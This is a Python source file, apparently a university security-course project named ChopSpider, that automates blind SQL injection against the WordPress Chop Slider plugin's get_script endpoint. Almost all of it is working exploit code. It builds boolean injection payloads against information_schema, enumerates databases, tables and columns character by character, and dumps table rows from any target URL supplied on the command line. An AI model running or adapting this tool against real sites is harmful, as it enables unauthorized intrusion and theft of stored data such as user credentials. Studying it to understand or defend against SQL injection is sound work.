

from string import *
import requests
import re
# from colorama import Fore
from sys import argv #argumentos para pasarle al programa
import argparse




caracteres= ascii_lowercase + digits + ascii_uppercase+'.-_/*$%?@#=<>, '


def banner():
    textoBaner= '''      
# # # # # # # # # # # # # # #  # # #  # # #  # # #  # # #  # #                                                       
#      |                                                      #
#      |             ChopSpider v1.0 2020-11-07               #
#      |               - Rozenberg, Jana                      #
#      |               - Wagner, Kevin                        #
#      |               - Mejia de la Gala, Rodolfo            #
#   /  |   \           - Seijo, Federico                      #
#  ;_/,L-,\_;        Grupo I                                  #
# \._/3  E\_./       Seguridad Informatica <K3521>            #
# \_./(::)\._/                                                #
#      ''                                                     #
#   _____                 ____     _    __                    #
#  / ___/ /  ___  ___    / __/__  (_)__/ /__ ____             #
# / /__/ _ \/ _ \/ _ \  _\ \/ _ \/ / _  / -_) __/             #
# \___/_//_/\___/ .__/ /___/ .__/_/\_,_/\__/_/  Blind-SQLi    #
#              /_/        /_/                                 #
#                                                             #
# # # # # # # # # # # # # # #  # # #  # # #  # # #  # # #  # #                 
    '''


    print("{}".format(textoBaner))



def parseArguments():
    parser= argparse.ArgumentParser()
    parser.add_argument("-u", "--url", type=str, nargs=1, help="URL raiz de la Web a vulnerar. Ej: http://www.test.com/")
    parser.add_argument("-db", "--database", action= 'store_true', help="Enumera el nombre de las bases de datos asociadas al sitio")
    parser.add_argument("-t", "--tables", nargs=1, help="Enumera todas las tablas de una base de datos <args: database>")
    parser.add_argument("-c", "--columns", type=str, nargs=2, help="Enumera todas las columnas de una tabla de una base de datos <args: tabla, database>")
    parser.add_argument("-du", "--dump", type=str, nargs=2,help="Retorna los datos o filas de una tabla de la base de datos <args: tabla, database>")

    parser.print_help()
    return parser.parse_args()

def conectar(sitio):
    r = requests.get(sitio)
    if r.status_code != requests.codes.ok:
        print('[ERROR] No se pudo conectar al sitio. Intentelo nuevamente o verifique que la url sea correcta.')
        exit()
    else:
        print('[URL] Conexion exitosa. Iniciando el ataque...')

def ascii_a_hex(string):
    output = ''.join(hex(ord(c))[2:] for c in string)
    return ('0x' + output)

#-----------------------------------------------------------------------------------------------------------------------

def obtenerCantidadFilas(tabla):
    cant = 1
    print("[INFO] Obteniendo cantidad de filas...")
    while (1):
        blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND (SELECT count(*) FROM ' + tabla + ')=' + str(cant) + ' --'
        print('[PAYLOAD] ' + blindSql)
        r = requests.get(sitio + blindSql)
        if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
            print("[INFO] Cantidad de filas: " + str(cant))
            return cant
            break
        else:
            cant += 1
    return "[ERROR]: No se encontro la cantidad de columnas"

#-----------------------------------------------------------------------------------------------------------------------
#                                               BASE DE DATOS
#-----------------------------------------------------------------------------------------------------------------------
def obtenerBD2():
    bds=[] #lista de todas las bases de datos que encuentre
    letra=1
    baseN= obtenerCantidadFilas('information_schema.SCHEMATA')-1 # Cantidad de bases de datos que tengo registradas en el info_schema (filas)
    nombreBD = "" #Nombre de la bd actual
    print("[INFO] Buscando bases de datos...")
    while(baseN>-1):
        for c in caracteres:
            # Reviso que el caracter que me devuelve el payload sea null
            breik= '/wp-content/plugins/chopslider/get_script/?id=1' + ' AND ascii(substring((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA limit '+str(baseN)+',1),'+str(letra)+',1))=00 --'

            r = requests.get(sitio + breik)
            # Si es null, es porque termino el nombre de la bd (string). Cambio de columna y busco una nueva bd que descifrar
            if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
                baseN = baseN - 1 #si, busca de la ultima a la primera :P
                bds.append(nombreBD)
                print("[INFO] Bases de datos encontradas: "+str(bds))
                nombreBD = ""
                letra = 1
                break

            # Revisa caracter a caracter el nombre de la bd
            blindSql = '/wp-content/plugins/chopslider/get_script/?id=1' + ' AND ascii(substring((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA limit ' + str(baseN) + ',1),' + str(letra) + ',1))= ' + str(ord(c)) + ' --'

            r = requests.get(sitio + blindSql)
            print('[PAYLOAD] '+blindSql)
            # Si obtengo algun True en el sitio, agrego esa letra y avanzo al siguiente caracter
            if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
                nombreBD+=c
                letra+=1
                print("[INFO] Se encontro un caracter: "+nombreBD)
                break

    print("[INFO] BASES DE DATOS: "+str(bds))


#-----------------------------------------------------------------------------------------------------------------------
#                                               TABLAS
#-----------------------------------------------------------------------------------------------------------------------
def obtenerLongitudTabla(t,database): #obtiene la longitud del nombre de una tabla (string)
    n=1
    while(1):
        blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='+database+' limit '+str(t)+',1),'+str(n)+',1))=00 --'
        print('[PAYLOAD] ' + blindSql)
        r = requests.get(sitio + blindSql)
        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
            print("[INFO] Longitud del nombre la tabla:"+str(n-1))
            return n-1
            break
        else:
            n+=1
    return "[ERROR]: No se encontro la longitud"


def obtenerCantidadTablas(database): #obtiene la cantidad de tablas de una BD
    cant=0
    while(1):
        blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND (SELECT count(*) FROM information_schema.tables WHERE table_schema='+database+')='+str(cant)+' --'
        print('[PAYLOAD] ' + blindSql)
        r = requests.get(sitio + blindSql)
        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
            print("[INFO] Cantidad de tablas:"+str(cant))
            return cant
            break
        else:
            cant+=1
    return "[ERROR]: No se encontro la cantidad de tablas"


def obtenerTablas(database):
    tablas=[]

    cantTablas= obtenerCantidadTablas(database)

    for tabla in range(cantTablas): #para cada tabla: calcular longitud del nombre y encontrarlo por fuerza bruta
        tam = obtenerLongitudTabla(tabla,database)
        nombreTabla = ""
        for i in range(tam):
            for c in caracteres:
                blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 and ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema='+database+' limit '+ str(tabla)+',1),'+str(i+1)+',1))='+str(ord(c))+' --'
                r = requests.get(sitio + blindSql)
                print('[PAYLOAD] ' + blindSql)
                if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
                    nombreTabla+=c
                    print("[INFO] Se encontro:"+nombreTabla)
                    break

        # print(nombreTabla)
        tablas.append(nombreTabla)
        print('[INFO] Tablas encontradas:'+str(tablas))
    print('[INFO] TABLAS:'+str(tablas))

#-----------------------------------------------------------------------------------------------------------------------
#                                               COLUMNAS
#-----------------------------------------------------------------------------------------------------------------------
def obtenerLongitudColumna(c,tabla,database): #longitud del nombre de una columna de una tabla (string)
    n=1
    while(1):
        blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_schema='+database+' and table_name='+tabla+' limit '+str(c)+',1),'+str(n)+',1))=00 --'
        print('[PAYLOAD] '+blindSql)
        r = requests.get(sitio + blindSql)
        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
            print("[INFO] Longitud del nombre de la COLUMNA: "+str(n-1))
            return n-1
            break
        else:
            n+=1
    return "[ERROR]: No se encontro la longitud de la columna"


def obtenerCantidadColumnas(tabla,database):
    cant=0
    while(1):
        blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND (SELECT count(*) FROM information_schema.columns WHERE table_schema='+database+' AND table_name='+tabla+')='+str(cant)+' --'
        print('[PAYLOAD] '+blindSql)
        r = requests.get(sitio + blindSql)
        if(re.search('preloader : true,',r.text) and re.search('responsive : true,',r.text)):
            print("[INFO] Cantidad de columnas: "+str(cant))
            return cant
            break
        else:
            cant+=1
    return "[ERROR]: No se encontro la cantidad de columnas"



def obtenerColumnas(tabla,database):

    ncolumnas= obtenerCantidadColumnas(tabla,database)
    columnas = []
    print("[INFO] Buscando columnas...")
    for columna in range(ncolumnas): #para cada columna: calcular longitud del nombre y encontrarlo por fuerza bruta
        tam = obtenerLongitudColumna(columna,tabla,database)
        nombreColumna = ""
        for i in range(tam):
            for c in caracteres:

                blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 and ascii(substring((SELECT COLUMN_NAME FROM information_schema.columns WHERE table_name='+tabla+' limit '+ str(columna)+',1),'+str(i+1)+',1))='+str(ord(c))+' --'
                r = requests.get(sitio + blindSql)
                print('[PAYLOAD] '+blindSql)
                if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
                    nombreColumna+=c
                    print("[INFO] Se encontro: "+nombreColumna)
                    break

        print("[INFO] Se encontro una columna: "+nombreColumna)
        columnas.append(nombreColumna)
        print('[INFO] COLUMNAS: '+str(columnas))
    return columnas

    pass

#-----------------------------------------------------------------------------------------------------------------------
#                                                  DATOS
#-----------------------------------------------------------------------------------------------------------------------
def obtenerDatos(tabla,database):
    columnas= obtenerColumnas(ascii_a_hex(tabla),ascii_a_hex(database))
   # columnas=['usuario','password','mail','telefono']
    cantFilas= obtenerCantidadFilas(database+'.'+tabla)
    datos=[]
    for columna in columnas:
        print("[*] Columna: "+ str(columna))
        for fila in range(cantFilas):
             print("[*] Fila: "+str(fila))
             i = 0
             nombreDato = ''
             while(i>-1):

                for c in caracteres:

                    blindSql = '/wp-content/plugins/chopslider/get_script/?id=1 AND ASCII(SUBSTRING((SELECT '+str(columna)+' FROM '+tabla +' limit '+str(fila)+',1),'+str(i+1)+',1))='+str(ord(c))+' --'
                    breik = '/wp-content/plugins/chopslider/get_script/?id=1 AND ASCII(SUBSTRING((SELECT ' + str(columna) + ' FROM ' + tabla + ' limit ' + str(fila) + ',1),' + str(i + 1) + ',1))=00 --'
                    r = requests.get(sitio + blindSql)
                    print('[PAYLOAD] '+blindSql)
                    if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)):
                        nombreDato+=c
                        print("[INFO] Se encontro: "+nombreDato)
                        break
                    r = requests.get(sitio + breik)
                    if (re.search('preloader : true,', r.text) and re.search('responsive : true,', r.text)): #si ya termino el string del dato, rompe el bucle
                        i=(-999)
                        break

                i=i+1
             datos.append(columna + ':' + nombreDato)
             print('[INFO] Datos encontrados:'+str(datos))
    print('[INFO] DUMPEO EXITOSO: '+str(datos))




    pass


#obtenerColumnas('0x7573756172696f73')


#-----------------------------------------------------------------------------------------------------------------------
#                                                  MAIN
#-----------------------------------------------------------------------------------------------------------------------
banner()

args= parseArguments() #Obtengo todos los parametros que me pasaron por linea de comandos
sitio = ''             #la pagina web
# sitio='http://localhost/wordpressSI'


# obtenerBD2()
# obtenerTablas(ascii_a_hex('si2020'))
# obtenerColumnas(ascii_a_hex('usuarios'),ascii_a_hex('si2020'))
# print(bcolors.OKGREEN + "Warning: No active frommets remain. Continue?" + bcolors.ENDC)
# obtenerDatos('usuarios','si2020')

if(args.url):
    sitio=args.url[0]
    print("[URL] Sitio a vulnerar: "+ sitio)

    if(args.database):
        conectar(sitio)
        obtenerBD2()

    elif(args.tables):
        conectar(sitio)
        obtenerTablas(ascii_a_hex(args.tables[0]))

    elif(args.columns):
        conectar(sitio)
        print(args.columns[0])
        tablaHexa= ascii_a_hex(args.columns[0])
        bd = ascii_a_hex(args.columns[1])
        obtenerColumnas(tablaHexa,bd)

    elif(args.dump):
        conectar(sitio)
        print(args.dump[0]+' '+args.dump[1])
        obtenerDatos(args.dump[0],args.dump[1])
    else:
        print("[WARNING] Especifique una URL y una operacion.")
else:
    print("[WARNING] Especifique una URL y una operacion.")
